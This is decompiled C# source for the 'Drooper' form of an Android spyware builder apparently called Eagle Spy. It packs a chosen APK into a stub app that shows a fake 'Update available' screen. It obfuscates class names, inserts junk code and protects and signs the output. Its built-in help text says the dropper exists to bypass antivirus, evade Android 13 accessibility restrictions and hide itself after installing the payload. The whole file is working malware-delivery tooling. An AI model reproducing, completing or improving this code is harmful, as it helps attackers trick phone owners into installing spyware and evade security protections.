using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

namespace Eagle_Spy
{
	// Token: 0x02000041 RID: 65
	[DesignerGenerated]
	public partial class Drooper : Form
	{
		// Token: 0x0600044F RID: 1103 RVA: 0x00058D6C File Offset: 0x00056F6C
		public Drooper()
		{
			base.FormClosing += this.Drooper_FormClosing;
			base.Load += this.Drooper_Load;
			this.TargetAPKPATH = "";
			this.TargetApkicon = "";
			this.originalapkname = "";
			this.APKINFO = "";
			this.outputpath = "";
			this.buildapkpath = "";
			this.assetspath = "";
			this.ClassesPath = "";
			this.stringspath = "";
			this.stubicon = "";
			this.BASEPATH = "";
			this.STUBPATH = "";
			this.apktoolpath = "";
			this.Apksignerpath = "";
			this.ApkZIPpath = "";
			this.Apkeditorpath = "";
			this.C = "";
			this.K = "";
			this.MainfistPath = "";
			this.ClassGen1 = "BroReceiver";
			this.ClassGen2 = "ConfirmDialog";
			this.ClassGen3 = "MainActivity";
			this.ClassGen4 = "SecoundActivity";
			this.ClassGen5 = "SessionManager";
			this.N_Class1 = "";
			this.N_Class2 = "";
			this.N_Class3 = "";
			this.N_Class4 = "";
			this.N_Class5 = "";
			this.firsttry = false;
			this.HoldExtract = false;
			this.Waitbuild = true;
			this.Waitprotect = true;
			this.cou = 0;
			this.FoundJava = false;
			this.InitializeComponent();
		}

		// Token: 0x06000452 RID: 1106 RVA: 0x0005B2EC File Offset: 0x000594EC
		private void Selectapkbtn_Click(object sender, EventArgs e)
		{
			if (this.BackgroundWorker1.IsBusy)
			{
				EagleAlert.Showinformation("Please Wait...");
			}
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
			openFileDialog.Filter = "apk Files|*.apk";
			openFileDialog.RestoreDirectory = true;
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult != DialogResult.OK)
			{
				this.TapkText.Text = "";
				return;
			}
			this.TapkText.Text = openFileDialog.FileName;
			this.TargetAPKPATH = openFileDialog.FileName;
			if (!this.BackgroundWorker1.IsBusy)
			{
				this.BackgroundWorker1.RunWorkerAsync();
			}
			this.originalapkname = Path.GetFileName(openFileDialog.FileName);
		}

		// Token: 0x06000453 RID: 1107 RVA: 0x0005B398 File Offset: 0x00059598
		private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
		{
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				return;
			}
			Drooper._Closure_0024__77_002D0 closure_0024__77_002D = null;
			Drooper._Closure_0024__77_002D0 CS_0024_003C_003E8__locals0 = new Drooper._Closure_0024__77_002D0(closure_0024__77_002D);
			CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
			this.APKINFO = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + this.TargetAPKPATH + "\"", 5000);
			if (this.apkicon.Image != null)
			{
				this.apkicon.Image.Dispose();
				this.apkicon.Image = null;
			}
			CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = Codes.ExtractName(this.TargetAPKPATH);
			CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", this.APKINFO));
			Conversions.ToString(Codes.RegexMatcher("(?<=versionCode=\\')(.*?)(?=\\')", this.APKINFO));
			Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", this.APKINFO));
			string text = Conversions.ToString(Codes.RegexMatcher("(?<=sdkVersion:\\')(.*?)(?=\\')", this.APKINFO));
			Codes.GetAndroidVersionName(text);
			string text2 = Conversions.ToString(Codes.RegexMatcher("(?<=targetSdkVersion:\\')(.*?)(?=\\')", this.APKINFO));
			Codes.GetAndroidVersionName(text2);
			if (string.IsNullOrEmpty(CS_0024_003C_003E8__locals0._0024VB_0024Local_appname))
			{
				MatchCollection matchCollection = Regex.Matches(this.APKINFO, "application-label:'([^']*)'");
				if (matchCollection.Count > 0)
				{
					using (IEnumerator enumerator = matchCollection.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							object obj = enumerator.Current;
							Match match = (Match)obj;
							string value = match.Groups[1].Value;
							Console.WriteLine("Found application label: " + value);
							CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = value;
						}
						goto IL_01CE;
					}
				}
				CS_0024_003C_003E8__locals0._0024VB_0024Local_appname = "Not found";
			}
			IL_01CE:
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) != 0)
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelname.Text = "App Name:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelid.Text = "App ID:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
					}));
				}
				else
				{
					base.Invoke(new VB_0024AnonymousDelegate_0(delegate
					{
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelname.Text = "姓名:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
						CS_0024_003C_003E8__locals0._0024VB_0024Me.labelid.Text = "标识符:";
						CS_0024_003C_003E8__locals0._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
					}));
				}
			}
			else
			{
				base.Invoke(new VB_0024AnonymousDelegate_0(delegate
				{
					CS_0024_003C_003E8__locals0._0024VB_0024Me.labelname.Text = "الأسم:";
					CS_0024_003C_003E8__locals0._0024VB_0024Me.textappname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_appname;
					CS_0024_003C_003E8__locals0._0024VB_0024Me.labelid.Text = "المعرف:";
					CS_0024_003C_003E8__locals0._0024VB_0024Me.textpkgname.Text = CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName;
				}));
			}
			string text3 = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", this.APKINFO));
			if (Operators.CompareString(Path.GetExtension(text3), ".xml", false) == 0)
			{
				text3 = text3.Replace(".xml", ".png");
			}
			string text4 = Codes.TempPathCache + CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName + "\\\\" + text3;
			string directoryName = Path.GetDirectoryName(text4);
			if (text3.Contains("anydpi-v26"))
			{
				string[] pngs = Codes.pngs;
				string[] array = pngs;
				foreach (string text5 in array)
				{
					string text6 = text3.Replace("mipmap-anydpi-v26", text5).Replace("drawable-anydpi-v26", text5);
					Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[] { "e \"", this.TargetAPKPATH, "\" \"", text6, "\" -o\"", directoryName, "\" -aoa" }), 5000);
				}
			}
			else
			{
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[] { "e \"", this.TargetAPKPATH, "\" \"", text3, "\" -o\"", directoryName, "\" -aoa" }), 5000);
			}
			Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
			{
				"e \"",
				this.TargetAPKPATH,
				"\" \"META-INF\" -o\"",
				Codes.TempPathCache,
				CS_0024_003C_003E8__locals0._0024VB_0024Local_PackageName,
				"\\META-INF\" -aoa"
			}), 5000);
			try
			{
				this.apkicon.Image = Image.FromFile(text4);
				this.pictureBox3.Image = this.apkicon.Image;
				this.pictureBox5.Image = this.pictureBox3.Image;
				this.TargetApkicon = text4;
			}
			catch (Exception)
			{
				this.apkicon.Image = Resources.noicon;
				this.TargetApkicon = null;
			}
		}

		// Token: 0x06000454 RID: 1108 RVA: 0x0005B810 File Offset: 0x00059A10
		private void Button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Selecte image icon [Only .PNG] (.png)";
			openFileDialog.Filter = "png Files|*.png";
			openFileDialog.RestoreDirectory = true;
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult != DialogResult.OK)
			{
				this.TargetApkicon = null;
				return;
			}
			Bitmap bitmap = new Bitmap(Image.FromFile(openFileDialog.FileName));
			this.apkicon.Image = bitmap;
			this.TargetApkicon = openFileDialog.FileName;
			this.pictureBox3.Image = this.apkicon.Image;
			this.pictureBox5.Image = this.pictureBox3.Image;
		}

		// Token: 0x06000455 RID: 1109 RVA: 0x0005B8A8 File Offset: 0x00059AA8
		public void LogBack(object[] objs)
		{
			if (base.InvokeRequired)
			{
				Drooper.addLogback addLogback = new Drooper.addLogback(this.LogBack);
				base.Invoke(addLogback, new object[] { objs });
				return;
			}
			string text = Conversions.ToString(objs[0]);
			this.logtext.AppendText("> " + text + "\r\n");
			this.logtext.SelectionStart = Strings.Len(this.logtext.Text);
			this.logtext.ScrollToCaret();
			this.logtext.Select();
		}

		// Token: 0x06000456 RID: 1110 RVA: 0x000034EE File Offset: 0x000016EE
		public void log(string Str)
		{
			this.LogBack(new object[] { Str });
		}

		// Token: 0x06000457 RID: 1111 RVA: 0x0005B934 File Offset: 0x00059B34
		private void Button2_Click(object sender, EventArgs e)
		{
			if (this.WorkWorker != null && this.WorkWorker.IsBusy)
			{
				EagleAlert.Showinformation("Dropper is working...");
				return;
			}
			if (string.IsNullOrEmpty(this.TargetAPKPATH))
			{
				EagleAlert.Showinformation("Please select app first");
				return;
			}
			if (string.IsNullOrEmpty(this.TargetApkicon))
			{
				EagleAlert.Showinformation("no icon is selected !!!");
				return;
			}
			if (string.IsNullOrEmpty(this.textpkgname.Text) | string.IsNullOrEmpty(this.textappname.Text))
			{
				EagleAlert.Showinformation("App name and package is required");
				return;
			}
			this.WorkWorker.RunWorkerAsync();
			this.cmdProcess = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			this.cmdProcess.EnableRaisingEvents = true;
			this.cmdProcess.StartInfo = processStartInfo;
			this.cmdProcess.OutputDataReceived += this.cmdOutputHandler;
			this.cmdProcess.ErrorDataReceived += this.cmdOutputHandler;
			this.cmdProcess.Start();
			this.cmdProcess.BeginOutputReadLine();
			this.cmdProcess.BeginErrorReadLine();
			this.log("Check for java");
			this.ExecuteCommand("java -version");
		}

		// Token: 0x06000458 RID: 1112 RVA: 0x00003500 File Offset: 0x00001700
		private void S()
		{
			Thread.Sleep(1000);
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x0005BA90 File Offset: 0x00059C90
		private void WorkWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			checked
			{
				try
				{
					this.log("Starting...");
					while (this.HoldExtract)
					{
						this.S();
					}
					this.log("Extracting...");
					string driv = Codes.GetDriv();
					this.WorkDIR = driv + "Apk_Dropper";
					this.STUBPATH = this.WorkDIR + "\\STUB";
					this.outputpath = this.WorkDIR + "\\out";
					this.buildapkpath = this.outputpath + "\\temp.apk";
					while (Directory.Exists(this.WorkDIR))
					{
						if (this.firsttry)
						{
							this.WorkDIR = Codes.GenerateRandomFolderName("drop");
							IL_00FE:
							this.apktoolpath = this.WorkDIR + "\\tools\\apktool.jar";
							this.Apksignerpath = this.WorkDIR + "\\tools\\signapk.jar";
							this.ApkZIPpath = this.WorkDIR + "\\tools\\zipalign.exe";
							this.Apkeditorpath = this.WorkDIR + "\\tools\\ApkEditor.jar";
							this.C = this.WorkDIR + "\\tools\\certificate.pem";
							this.K = this.WorkDIR + "\\tools\\key.pk8";
							File.WriteAllBytes(this.apktoolpath, Resources.apktool);
							File.WriteAllBytes(this.Apksignerpath, Resources.signapk);
							File.WriteAllBytes(this.ApkZIPpath, Resources.zipalign);
							File.WriteAllBytes(this.Apkeditorpath, Resources.APKEditor);
							File.WriteAllBytes(this.STUBPATH + "\\drop.zip", File.ReadAllBytes(Application.StartupPath + "\\res\\Library\\classes.bin"));
							ZipFile.ExtractToDirectory(this.STUBPATH + "\\drop.zip", this.STUBPATH);
							this.S();
							File.Delete(this.STUBPATH + "\\drop.zip");
							this.log("loading payload...");
							this.assetspath = this.STUBPATH + "\\assets";
							this.BASEPATH = this.assetspath + "\\childapp.apk";
							if (File.Exists(this.BASEPATH))
							{
								File.Delete(this.BASEPATH);
							}
							File.Copy(this.TargetAPKPATH, this.BASEPATH);
							this.stringspath = this.STUBPATH + "\\res\\values\\strings.xml";
							string text = this.STUBPATH + "\\res\\layout\\exptionactivity.xml";
							File.WriteAllText(this.stringspath, File.ReadAllText(this.stringspath).Replace("Time for Updates!", this.guna2TextBox8.Text));
							File.WriteAllText(this.stringspath, File.ReadAllText(this.stringspath).Replace("We have added numerous new features and fixed some bugs to make the app as comfortable as possible for you.", this.guna2TextBox7.Text));
							File.WriteAllText(this.stringspath, File.ReadAllText(this.stringspath).Replace("Update", this.guna2TextBox6.Text));
							File.WriteAllText(text, File.ReadAllText(text).Replace("Updated on feb 9, 2024", this.guna2TextBox5.Text));
							File.WriteAllText(text, File.ReadAllText(text).Replace("Update available", this.guna2TextBox2.Text));
							File.WriteAllText(text, File.ReadAllText(text).Replace("To use this app, download the latest version.", this.guna2TextBox3.Text));
							File.WriteAllText(text, File.ReadAllText(text).Replace("What's new", this.guna2TextBox4.Text));
							File.WriteAllText(text, Regex.Replace(File.ReadAllText(text), "(?<=\")Update(?=\")", this.guna2TextBox1.Text));
							this.MainfistPath = this.STUBPATH + "\\AndroidManifest.xml";
							this.stubicon = this.STUBPATH + "\\res\\drawable\\myicon.png";
							this.log("loading data...");
							string text2 = File.ReadAllText(this.stringspath).Replace("[MY-NAME]", this.textappname.Text);
							File.WriteAllText(this.stringspath, text2);
							File.Delete(this.stubicon);
							File.Copy(this.TargetApkicon, this.stubicon);
							this.log("Encoding");
							this.ClassesPath = this.STUBPATH + "\\smali\\com\\appd\\instll";
							string text3 = "com";
							string text4 = "appd";
							string text5 = "instll";
							string[] files = Directory.GetFiles(this.STUBPATH + "\\smali\\com\\appd\\instll");
							if (!File.Exists(reso.Junkpath))
							{
								File.WriteAllBytes(reso.Junkpath, Resources.junk);
							}
							string text6 = File.ReadAllText(reso.Junkpath);
							this.N_Class1 = this.RandommMadv2(30);
							this.N_Class2 = this.RandommMadv2(30);
							this.N_Class3 = this.RandommMadv2(30);
							this.N_Class4 = this.RandommMadv2(30);
							this.N_Class5 = this.RandommMadv2(30);
							string text7 = File.ReadAllText(this.MainfistPath).Replace(this.ClassGen1, this.N_Class1).Replace(this.ClassGen2, this.N_Class2)
								.Replace(this.ClassGen3, this.N_Class3)
								.Replace(this.ClassGen4, this.N_Class4)
								.Replace(this.ClassGen5, this.N_Class5);
							File.WriteAllText(this.MainfistPath, text7);
							string[] array = files;
							string[] array2 = array;
							foreach (string text8 in array2)
							{
								string text9 = File.ReadAllText(text8).Replace("[T_ID]", this.textpkgname.Text).Replace(this.ClassGen1, this.N_Class1)
									.Replace(this.ClassGen2, this.N_Class2)
									.Replace(this.ClassGen3, this.N_Class3)
									.Replace(this.ClassGen4, this.N_Class4)
									.Replace(this.ClassGen5, this.N_Class5);
								File.WriteAllText(text8, text9);
							}
							int num = 1;
							do
							{
								string text10 = this.RandommMadv2(30);
								File.WriteAllText(this.ClassesPath + "\\" + text10 + ".smali", text6.Replace("spymax", text3).Replace("stub7", text4 + "/" + text5).Replace("[MYNAME]", text10));
								num++;
							}
							while (num <= 50);
							this.S();
							this.S();
							this.S();
							this.log("Building Dropper...");
							this.ExecuteCommand(string.Concat(new string[] { "java -jar ", this.apktoolpath, " b -f ", this.STUBPATH, " -o ", this.buildapkpath }));
							do
							{
								this.S();
							}
							while (this.Waitbuild);
							this.log("Zip Align..");
							string text11 = string.Concat(new string[]
							{
								this.ApkZIPpath,
								" 4 \"",
								this.buildapkpath,
								"\" \"",
								this.buildapkpath.Replace("temp.apk", "temp_zip.apk"),
								"\""
							});
							string text12 = this.buildapkpath.Replace("temp.apk", "temp_zip.apk");
							this.ExecuteCommand(text11);
							do
							{
								this.S();
							}
							while (!File.Exists(text12) | Codes.FileInUse(text12));
							this.log("Protect Dropper..");
							string text13 = text12.Replace(".apk", "_protected.apk");
							string text14 = string.Concat(new string[] { "java -jar ", this.Apkeditorpath, " p  -i \"", text12, "\"" });
							this.ExecuteCommand(text14);
							do
							{
								this.S();
							}
							while (this.Waitprotect | Codes.FileInUse(text13));
							File.Delete(text12);
							this.log("Signing Dropper..");
							File.WriteAllBytes(this.C, Resources.C2);
							File.WriteAllBytes(this.K, Resources.K2);
							this.S();
							string text15 = this.outputpath + "\\" + this.originalapkname.Replace(".apk", "_Dropper.apk");
							string text16 = string.Concat(new string[]
							{
								"java -jar \"", this.Apksignerpath, "\" sign --key \"", this.K, "\" --cert \"", this.C, "\"  --v2-signing-enabled true --v3-signing-enabled true --out \"", text15, "\" \"", text13,
								"\""
							});
							this.ExecuteCommand(text16);
							do
							{
								this.S();
							}
							while (!File.Exists(text15) | Codes.FileInUse(text15) | Codes.FileInUse(text13));
							File.Delete(text13);
							this.log("finishing...");
							this.S();
							this.log("5");
							this.S();
							this.log("4");
							this.S();
							this.log("3");
							this.S();
							this.log("2");
							this.S();
							this.log("1");
							this.S();
							Directory.Delete(this.STUBPATH, true);
							Process.Start(this.outputpath);
							base.Invoke(new VB_0024AnonymousDelegate_0(delegate
							{
								base.Close();
								this.StopCommandPrompt();
							}));
							return;
						}
						this.firsttry = true;
						Codes.DirectoryDeleteLong(this.WorkDIR);
						Thread.Sleep(3000);
					}
					Directory.CreateDirectory(this.WorkDIR);
					Directory.CreateDirectory(this.WorkDIR + "\\tools");
					Directory.CreateDirectory(this.STUBPATH);
					Directory.CreateDirectory(this.outputpath);
					goto IL_00FE;
				}
				catch (Exception ex)
				{
					Exception ex2 = ex;
					if (Codes.MyMsgBox("Drooper Error", ex2.Message, false, Resources.error48px))
					{
						base.Invoke(new VB_0024AnonymousDelegate_0(delegate
						{
							base.Close();
						}));
					}
				}
			}
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x0005C474 File Offset: 0x0005A674
		private void StopCommandPrompt()
		{
			try
			{
				if (this.cmdProcess != null)
				{
					this.ExecuteCommand("EXIT");
					this.S();
					this.cmdProcess.CloseMainWindow();
					this.cmdProcess.Close();
					this.cmdProcess.Dispose();
					this.cmdProcess = null;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600045B RID: 1115 RVA: 0x0005C4D8 File Offset: 0x0005A6D8
		public string RandommMadv2(int minCharacters)
		{
			string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
			if (this.rshit == null)
			{
				this.rshit = new Random();
			}
			string text2 = "";
			checked
			{
				while (text2.Length < minCharacters)
				{
					text2 += Conversions.ToString(text[this.rshit.Next(0, text.Length - 1)]);
				}
				this.cou++;
				return text2.ToString().ToLower() + Conversions.ToString(this.cou);
			}
		}

		// Token: 0x0600045C RID: 1116 RVA: 0x0000350C File Offset: 0x0000170C
		private void ExecuteCommand(string command)
		{
			this.cmdProcess.StandardInput.WriteLine(command);
			this.cmdProcess.StandardInput.Flush();
		}

		// Token: 0x0600045D RID: 1117 RVA: 0x0005C560 File Offset: 0x0005A760
		private void cmdOutputHandler(object sender, DataReceivedEventArgs e)
		{
			if (!string.IsNullOrEmpty(e.Data))
			{
				string data = e.Data;
				if (data.Contains("java"))
				{
					this.log(data);
				}
				if (data.Contains("[PROTECT] Saved to"))
				{
					this.Waitprotect = false;
				}
				if (data.StartsWith("I:"))
				{
					this.log(data.Replace("I:", ""));
				}
				if (data.Contains("[PROTECT]") && !data.Contains("Writing:"))
				{
					this.log(data);
				}
				else if (data.Contains("Built apk"))
				{
					this.Waitbuild = false;
				}
				else if (data.StartsWith("E:"))
				{
					this.log(data.Replace("E:", "Error:"));
				}
				if ((data.Contains("Java(TM)") | data.Contains("OpenJDK")) && !this.FoundJava)
				{
					this.FoundJava = true;
					this.HoldExtract = false;
				}
			}
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x00002423 File Offset: 0x00000623
		private void Drooper_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x0005C65C File Offset: 0x0005A85C
		private void Button3_Click(object sender, EventArgs e)
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				Codes.MyMsgBox("info", "安装程序就像加载程序，它将您的apk保存在其中，当用户打开它时，它会要求用户安装您的应用程序，为什么？ :\r\n1: Clean loader 保留 apk 以绕过防病毒软件\r\n2：帮助绕过android 13辅助功能限制\r\n3：安装apk后隐藏自身", false, Resources.information48px);
				return;
			}
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				Codes.MyMsgBox("info", "dropper is like loader , it hold your apk inside of it ,and when user opens it, it will ask user to install your app , why? :\r\n1: Clean loader hold the apk to bypass antivirus\r\n2: Help to Bypass android 13 Accessibility restriction\r\n3: Hide itself after dropping the payload \r\n", false, Resources.information48px);
				return;
			}
			Codes.MyMsgBox("info", "المثبت مثل أداة التحميل ، فهو يحمل ملف apk بداخله ، وعندما يفتحه المستخدم ، سيطلب من المستخدم تثبيت تطبيقك ، لماذا؟ :\r\n1: محمل نظيف يحمل apk لتجاوز مكافحة الفيروسات\r\n2: المساعدة في تجاوز قيود إمكانية الوصول لنظام Android 13\r\n3: إخفاء نفسه بعد تثبيت apk", false, Resources.information48px);
		}

		// Token: 0x06000460 RID: 1120 RVA: 0x0005C6D0 File Offset: 0x0005A8D0
		private void Translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "AR", false) != 0)
			{
				if (Operators.CompareString(language, "CN", false) == 0)
				{
					this.selectapkbtn.Text = "选择一个文件";
					this.labelname.Text = "应用名称";
					this.Button1.Text = "选择图像";
					this.Button2.Text = "建造";
					return;
				}
			}
			else
			{
				this.selectapkbtn.Text = "إختيار تطبيق";
				this.labelname.Text = "اسم التطبيق";
				this.Button1.Text = "اختيار صورة";
				this.Button2.Text = "بناء";
			}
		}

		// Token: 0x06000461 RID: 1121 RVA: 0x0000352F File Offset: 0x0000172F
		private void Drooper_Load(object sender, EventArgs e)
		{
			this.UpdateLanguage();
		}

		// Token: 0x06000462 RID: 1122 RVA: 0x00002423 File Offset: 0x00000623
		private void DrakeUISymbolLabel1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000463 RID: 1123 RVA: 0x00003537 File Offset: 0x00001737
		private void textappname_TextChanged(object sender, EventArgs e)
		{
			this.label1.Text = this.textappname.Text;
		}

		// Token: 0x06000464 RID: 1124 RVA: 0x00002423 File Offset: 0x00000623
		private void drakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000465 RID: 1125 RVA: 0x0005C784 File Offset: 0x0005A984
		private void UpdateEnglish()
		{
			this.label8.Text = "Secure Dropper";
			this.selectapkbtn.Text = "Select Apk";
			this.labelname.Text = "App name";
			this.labelid.Text = "Package Name";
			this.Button1.Text = "icon";
			this.guna2TextBox8.Text = "Time for Updates!";
			this.guna2TextBox7.Text = "We have added numerous new features and fixed some bugs to make the app as comfortable as possible for you";
			this.guna2TextBox6.Text = "UPDATE";
			this.guna2TextBox5.Text = "Updated on feb 9, 2024";
			this.guna2TextBox4.Text = "What's New";
			this.guna2TextBox3.Text = "To use this app, download the latest version";
			this.guna2TextBox2.Text = "UPDATE";
			this.guna2TextBox1.Text = "Update now";
			this.Button2.Text = "Build Dropper";
		}

		// Token: 0x06000466 RID: 1126 RVA: 0x0005C874 File Offset: 0x0005AA74
		private void UpdateChinese()
		{
			this.label8.Text = "安全 Dropper";
			this.selectapkbtn.Text = "选择 Apk";
			this.labelname.Text = "应用名称";
			this.labelid.Text = "包名";
			this.Button1.Text = "图标";
			this.guna2TextBox8.Text = "更新时间!";
			this.guna2TextBox7.Text = "我们添加了许多新功能并修复了一些错误，以使应用程序尽可能舒适";
			this.guna2TextBox6.Text = "更新";
			this.guna2TextBox5.Text = "更新于2024年2月9日";
			this.guna2TextBox4.Text = "新功能";
			this.guna2TextBox3.Text = "要使用此应用程序，请下载最新版本";
			this.guna2TextBox2.Text = "更新";
			this.guna2TextBox1.Text = "立即更新";
			this.Button2.Text = "创建 Dropper";
		}

		// Token: 0x06000467 RID: 1127 RVA: 0x0005C964 File Offset: 0x0005AB64
		private void UpdateRussian()
		{
			this.label8.Text = "Безопасный Dropper";
			this.selectapkbtn.Text = "Выбрать Apk";
			this.labelname.Text = "Название приложения";
			this.labelid.Text = "Имя пакета";
			this.Button1.Text = "иконка";
			this.guna2TextBox8.Text = "Время обновлений!";
			this.guna2TextBox7.Text = "Мы добавили много новых функций и исправили ошибки, чтобы сделать приложение максимально удобным для вас";
			this.guna2TextBox6.Text = "ОБНОВИТЬ";
			this.guna2TextBox5.Text = "Обновлено 9 февраля 2024 года";
			this.guna2TextBox4.Text = "Что нового";
			this.guna2TextBox3.Text = "Чтобы использовать это приложение, загрузите последнюю версию";
			this.guna2TextBox2.Text = "ОБНОВИТЬ";
			this.guna2TextBox1.Text = "Обновить сейчас";
			this.Button2.Text = "Создать Dropper";
		}

		// Token: 0x06000468 RID: 1128 RVA: 0x0005CA54 File Offset: 0x0005AC54
		private void UpdateLanguage()
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res", "Config", "Language.inf");
			if (File.Exists(text))
			{
				string text2 = File.ReadAllText(text);
				if (text2.Contains("English"))
				{
					this.UpdateEnglish();
					return;
				}
				if (text2.Contains("Russian"))
				{
					this.UpdateRussian();
					return;
				}
				if (text2.Contains("Chinese"))
				{
					this.UpdateChinese();
					return;
				}
				this.UpdateEnglish();
			}
		}

		// Token: 0x040003AA RID: 938
		private string TargetAPKPATH;

		// Token: 0x040003AB RID: 939
		private string TargetApkicon;

		// Token: 0x040003AC RID: 940
		private string originalapkname;

		// Token: 0x040003AD RID: 941
		private string APKINFO;

		// Token: 0x040003AE RID: 942
		private Process cmdProcess;

		// Token: 0x040003AF RID: 943
		private string WorkDIR;

		// Token: 0x040003B0 RID: 944
		private string outputpath;

		// Token: 0x040003B1 RID: 945
		private string buildapkpath;

		// Token: 0x040003B2 RID: 946
		private string assetspath;

		// Token: 0x040003B3 RID: 947
		private string ClassesPath;

		// Token: 0x040003B4 RID: 948
		private string stringspath;

		// Token: 0x040003B5 RID: 949
		private string stubicon;

		// Token: 0x040003B6 RID: 950
		private string BASEPATH;

		// Token: 0x040003B7 RID: 951
		private string STUBPATH;

		// Token: 0x040003B8 RID: 952
		private string apktoolpath;

		// Token: 0x040003B9 RID: 953
		private string Apksignerpath;

		// Token: 0x040003BA RID: 954
		private string ApkZIPpath;

		// Token: 0x040003BB RID: 955
		private string Apkeditorpath;

		// Token: 0x040003BC RID: 956
		private string C;

		// Token: 0x040003BD RID: 957
		private string K;

		// Token: 0x040003BE RID: 958
		private string MainfistPath;

		// Token: 0x040003BF RID: 959
		private string ClassGen1;

		// Token: 0x040003C0 RID: 960
		private string ClassGen2;

		// Token: 0x040003C1 RID: 961
		private string ClassGen3;

		// Token: 0x040003C2 RID: 962
		private string ClassGen4;

		// Token: 0x040003C3 RID: 963
		private string ClassGen5;

		// Token: 0x040003C4 RID: 964
		private string N_Class1;

		// Token: 0x040003C5 RID: 965
		private string N_Class2;

		// Token: 0x040003C6 RID: 966
		private string N_Class3;

		// Token: 0x040003C7 RID: 967
		private string N_Class4;

		// Token: 0x040003C8 RID: 968
		private string N_Class5;

		// Token: 0x040003C9 RID: 969
		private bool firsttry;

		// Token: 0x040003CA RID: 970
		private bool HoldExtract;

		// Token: 0x040003CB RID: 971
		private bool Waitbuild;

		// Token: 0x040003CC RID: 972
		private bool Waitprotect;

		// Token: 0x040003CD RID: 973
		private Random rshit;

		// Token: 0x040003CE RID: 974
		private int cou;

		// Token: 0x040003CF RID: 975
		private bool FoundJava;

		// Token: 0x02000042 RID: 66
		// (Invoke) Token: 0x0600046C RID: 1132
		public delegate void addLogback(object[] objs);

		// Token: 0x02000043 RID: 67
		[CompilerGenerated]
		internal sealed class _Closure_0024__77_002D0
		{
			// Token: 0x0600046F RID: 1135 RVA: 0x0000355D File Offset: 0x0000175D
			public _Closure_0024__77_002D0(Drooper._Closure_0024__77_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
					this._0024VB_0024Local_PackageName = arg0._0024VB_0024Local_PackageName;
				}
			}

			// Token: 0x06000470 RID: 1136 RVA: 0x0005CAD4 File Offset: 0x0005ACD4
			internal void _Lambda_0024__0()
			{
				this._0024VB_0024Me.labelname.Text = "الأسم:";
				this._0024VB_0024Me.textappname.Text = this._0024VB_0024Local_appname;
				this._0024VB_0024Me.labelid.Text = "المعرف:";
				this._0024VB_0024Me.textpkgname.Text = this._0024VB_0024Local_PackageName;
			}

